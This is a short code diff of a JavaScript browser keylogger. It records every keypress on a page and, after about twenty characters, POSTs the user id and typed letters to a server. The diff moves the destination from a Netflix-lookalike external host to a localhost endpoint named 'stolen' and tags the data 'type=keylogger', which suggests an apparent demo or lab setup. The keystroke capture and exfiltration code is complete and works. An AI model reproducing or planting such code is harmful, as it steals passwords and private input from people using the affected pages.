@@ -22,10 +22,10 @@ document.onkeypress = (evt) => {
 
     if (letterArray.length > 19) {
       let xhr = new window.XMLHttpRequest()
-      xhr.open('POST', 'https://netflix.719ben.com', true)
+      xhr.open('POST', 'http://localhost:8000/stolen', true)
       xhr.setRequestHeader('Content-type',
         'application/x-www-form-urlencoded')
-      xhr.send(`userId=${userId}&letters=${letterArray}`)
+      xhr.send(`userId=${userId}&letters=${letterArray}&type=keylogger`)
       // clear the array
       letterArray = ''
     }
